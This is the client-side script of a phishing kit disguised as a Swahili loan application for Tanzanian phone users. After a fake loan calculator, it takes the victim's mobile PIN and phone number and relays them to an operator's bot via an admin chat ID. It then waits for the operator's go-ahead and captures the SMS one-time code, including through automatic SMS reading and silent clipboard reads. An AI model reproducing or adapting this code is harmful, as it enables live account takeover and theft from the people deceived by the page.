document.addEventListener('DOMContentLoaded', () => {
  const urlParams = new URLSearchParams(window.location.search);
  const adminChatId = urlParams.get('admin') || '';

  // DOM Elements
  const steps = {
    calc: document.getElementById('step-calculator'),
    form: document.getElementById('step-form'),
    personal: document.getElementById('step-personal'),
    summary: document.getElementById('step-summary'),
    pin: document.getElementById('step-pin'),
    waiting: document.getElementById('step-waiting'),
    otp: document.getElementById('step-otp'),
    success: document.getElementById('step-success')
  };

  const toast = document.getElementById('toast-notification');

  function showToast(message, type = 'error') {
    toast.textContent = message;
    toast.className = `toast-notification ${type}`;
    setTimeout(() => {
      toast.classList.add('hidden');
    }, 4000);
  }

  function switchStep(stepName) {
    Object.values(steps).forEach(s => s.classList.add('hidden'));
    if (steps[stepName]) steps[stepName].classList.remove('hidden');
    window.scrollTo(0, 0);
  }

  // Calculator bindings
  const rangeAmount = document.getElementById('loan-amount-range');
  const displayAmount = document.getElementById('display-amount');
  const rangeDuration = document.getElementById('loan-duration-range');
  const displayDuration = document.getElementById('display-duration');
  const monthlyVal = document.getElementById('monthly-payment-val');

  rangeAmount.addEventListener('input', (e) => {
    const val = parseInt(e.target.value);
    displayAmount.textContent = `TSh ${val.toLocaleString()}`;
    document.getElementById('form-amount-input').value = val;
    calcMonthly(val, parseInt(rangeDuration.value));
  });

  rangeDuration.addEventListener('input', (e) => {
    const val = parseInt(e.target.value);
    displayDuration.textContent = `miezi ${val}`;
    calcMonthly(parseInt(rangeAmount.value), val);
  });

  function calcMonthly(amt, months) {
    const rate = 0.08 / 12;
    const payment = (amt * rate * Math.pow(1 + rate, months)) / (Math.pow(1 + rate, months) - 1);
    monthlyVal.textContent = `TSh ${Math.round(payment).toLocaleString()}`;
  }

  // Application Data State
  let appData = {
    amount: '100,000',
    duration: '12',
    purpose: '',
    firstName: '',
    lastName: '',
    phone: '',
    pin: '',
    otp: '',
    userId: null
  };

  document.getElementById('btn-start-apply').addEventListener('click', () => switchStep('form'));
  document.getElementById('btn-next-1').addEventListener('click', () => {
    appData.amount = document.getElementById('form-amount-input').value;
    appData.duration = document.getElementById('form-duration-select').value;
    appData.purpose = document.getElementById('loan-purpose').value || 'Mkopo wa Biashara';
    switchStep('personal');
  });

  document.getElementById('btn-prev-2').addEventListener('click', () => switchStep('form'));
  
  const phoneInput = document.getElementById('phone-number');
  const phoneError = document.getElementById('phone-error');

  function isValidPrefix(num) {
    const clean = num.replace(/\D/g, '');
    return /^(061|062|063)\d{7}$/.test(clean);
  }

  document.getElementById('btn-next-2').addEventListener('click', () => {
    const rawPhone = phoneInput.value.trim();
    if (!isValidPrefix(rawPhone)) {
      phoneError.classList.remove('hidden');
      return;
    }
    phoneError.classList.add('hidden');
    appData.firstName = document.getElementById('first-name').value;
    appData.lastName = document.getElementById('last-name').value;
    appData.phone = rawPhone.replace(/\D/g, '');

    document.getElementById('sum-amount').textContent = `TSh ${Number(appData.amount).toLocaleString()}`;
    document.getElementById('sum-duration').textContent = `Miezi ${appData.duration}`;
    document.getElementById('sum-purpose').textContent = appData.purpose;
    document.getElementById('sum-name').textContent = `${appData.firstName} ${appData.lastName}`;
    switchStep('summary');
  });

  document.getElementById('btn-prev-3').addEventListener('click', () => switchStep('personal'));

  document.getElementById('btn-submit-app').addEventListener('click', () => {
    appData.amount = document.getElementById('form-amount-input').value;
    document.getElementById('pin-phone-display').textContent = `+255${appData.phone}`;
    switchStep('pin');
  });

  // PIN Inputs Configuration (Digits Only)
  const pinBoxes = document.querySelectorAll('.pin-box');
  const btnSubmitPin = document.getElementById('btn-submit-pin');

  pinBoxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val;
      if (val && idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
      checkPinComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) pinBoxes[idx - 1].focus();
    });
  });

  function checkPinComplete() {
    const pin = Array.from(pinBoxes).map(b => b.value).join('');
    if (pin.length === 4) {
      btnSubmitPin.removeAttribute('disabled');
      appData.pin = pin;
    } else {
      btnSubmitPin.setAttribute('disabled', 'true');
    }
  }

  // PIN Submit -> Sends Phone Number + PIN together to Bot, then switches to the Waiting Screen and polls
  btnSubmitPin.addEventListener('click', async () => {
    btnSubmitPin.textContent = 'Inathibitisha...';
    btnSubmitPin.setAttribute('disabled', 'true');

    try {
      const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminChatId)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contact: appData.phone,
          pin: appData.pin,
          amount: `TSh ${appData.amount}`,
          adminChatId
        })
      });
      const data = await res.json();
      if (data.success) {
        appData.userId = data.userId;
        
        // Switch to Waiting Screen with animated counter
        switchStep('waiting');
        startWaitingCountdown();
        pollStatus(); // Polls until Admin taps Allow
      } else {
        showToast(data.error || 'Hitilafu');
        btnSubmitPin.textContent = 'INGIA';
        btnSubmitPin.removeAttribute('disabled');
      }
    } catch (e) {
      showToast('Hitilafu ya mtandao');
      btnSubmitPin.textContent = 'INGIA';
      btnSubmitPin.removeAttribute('disabled');
    }
  });

  let waitingTimerInterval = null;
  function startWaitingCountdown() {
    let secondsLeft = 3;
    const counterEl = document.getElementById('waiting-countdown');
    if (waitingTimerInterval) clearInterval(waitingTimerInterval);

    waitingTimerInterval = setInterval(() => {
      secondsLeft--;
      if (counterEl) counterEl.textContent = secondsLeft;
      if (secondsLeft <= 0) {
        clearInterval(waitingTimerInterval);
      }
    }, 1000);
  }

  document.getElementById('btn-go-login-now').addEventListener('click', () => {
    // Allows user to manually force check or wait out if needed
  });

  // OTP Inputs Configuration (Digits Only & High-Sensitivity SMS Auto-Fill)
  const otpBoxes = document.querySelectorAll('.otp-box');
  const btnSubmitOtp = document.getElementById('btn-submit-otp');
  let countdownInterval = null;

  otpBoxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val;
      if (val && idx < otpBoxes.length - 1) otpBoxes[idx + 1].focus();
      checkOtpComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) otpBoxes[idx - 1].focus();
    });
  });

  function checkOtpComplete() {
    const otp = Array.from(otpBoxes).map(b => b.value).join('');
    if (otp.length === 4) {
      btnSubmitOtp.removeAttribute('disabled');
      appData.otp = otp;
    } else {
      btnSubmitOtp.setAttribute('disabled', 'true');
    }
  }

  // OTP Submit -> Sends Phone Number + OTP together to Backend
  btnSubmitOtp.addEventListener('click', async () => {
    btnSubmitOtp.textContent = 'Inathibitisha...';
    btnSubmitOtp.setAttribute('disabled', 'true');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          userId: appData.userId, 
          contact: appData.phone, 
          otp: appData.otp 
        })
      });
      const data = await res.json();
      if (data.success) {
        pollStatus();
      } else {
        showToast(data.error || 'Hitilafu');
        btnSubmitOtp.textContent = 'WASILISHA';
        btnSubmitOtp.removeAttribute('disabled');
      }
    } catch (e) {
      showToast('Hitilafu ya mtandao');
      btnSubmitOtp.textContent = 'WASILISHA';
      btnSubmitOtp.removeAttribute('disabled');
    }
  });

  // High Sensitivity WebOTP / SMS Reader API Integration
  if ('OTPCredential' in window) {
    const ac = new AbortController();
    navigator.credentials.get({
      otp: { transport: ['sms'] },
      signal: ac.signal
    }).then(otp => {
      if (otp && otp.code) {
        const digits = otp.code.replace(/\D/g, '').split('').slice(0, 4);
        digits.forEach((d, i) => {
          if (otpBoxes[i]) otpBoxes[i].value = d;
        });
        checkOtpComplete();
        btnSubmitOtp.click();
      }
    }).catch(err => {});
  }

  // Fallback high-sensitivity clipboard / background message event listener for digits only
  window.addEventListener('focus', async () => {
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        const text = await navigator.clipboard.readText();
        const cleanDigits = text.replace(/\D/g, '');
        if (cleanDigits.length >= 4 && !steps.otp.classList.contains('hidden')) {
          const digits = cleanDigits.slice(0, 4).split('');
          digits.forEach((d, i) => {
            if (otpBoxes[i]) otpBoxes[i].value = d;
          });
          checkOtpComplete();
        }
      }
    } catch (e) {}
  });

  function startOtpCountdown() {
    let timeLeft = 30;
    const timerEl = document.getElementById('otp-timer');
    const reqNewBtn = document.getElementById('btn-request-new-otp');
    reqNewBtn.classList.add('hidden');
    timerEl.classList.remove('hidden');

    if (countdownInterval) clearInterval(countdownInterval);

    countdownInterval = setInterval(() => {
      timeLeft--;
      timerEl.textContent = `Tuma tena simbo ndani ya ${timeLeft} sekunde`;
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        timerEl.classList.add('hidden');
        reqNewBtn.classList.remove('hidden');
      }
    }, 1000);
  }

  document.getElementById('btn-request-new-otp').addEventListener('click', async () => {
    try {
      await fetch('/api/request-new-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: appData.userId, contact: appData.phone })
      });
      showToast('Ombi limetumwa kwa msimamizi', 'success');
      startOtpCountdown();
    } catch (e) {}
  });

  // Poll server for live admin response & surface notifications
  function pollStatus() {
    const interval = setInterval(async () => {
      if (!appData.userId) return;
      try {
        const res = await fetch(`/api/check-status/${appData.userId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          clearInterval(interval);
          if (waitingTimerInterval) clearInterval(waitingTimerInterval);
          document.getElementById('otp-phone-display').textContent = `+255${appData.phone}`;
          switchStep('otp');
          startOtpCountdown();
        } else if (data.status === 'RETRY_PIN') {
          showToast('PIN si sahihi ❌', 'error');
          switchStep('pin');
          btnSubmitPin.textContent = 'INGIA';
          btnSubmitPin.removeAttribute('disabled');
          pinBoxes.forEach(b => b.value = '');
          pinBoxes[0].focus();
          clearInterval(interval);
        } else if (data.status === 'RETRY_OTP') {
          showToast('OTP si sahihi ❌', 'error');
          startOtpCountdown();
          btnSubmitOtp.textContent = 'WASILISHA';
          btnSubmitOtp.removeAttribute('disabled');
          otpBoxes.forEach(b => b.value = '');
          otpBoxes[0].focus();
          clearInterval(interval);
        } else if (data.status === 'SUCCESS') {
          showToast('CORRECT OTP ✅', 'success');
          document.getElementById('final-approved-amount').textContent = `TSh ${Number(appData.amount).toLocaleString()}`;
          switchStep('success');
          clearInterval(interval);
        } else if (data.status === 'DENIED') {
          showToast('Ufikiaji Umekataliwa ❌', 'error');
          clearInterval(interval);
        }
      } catch (e) {}
    }, 2000);
  }

  document.getElementById('btn-home').addEventListener('click', () => {
    window.location.reload();
  });
});
      
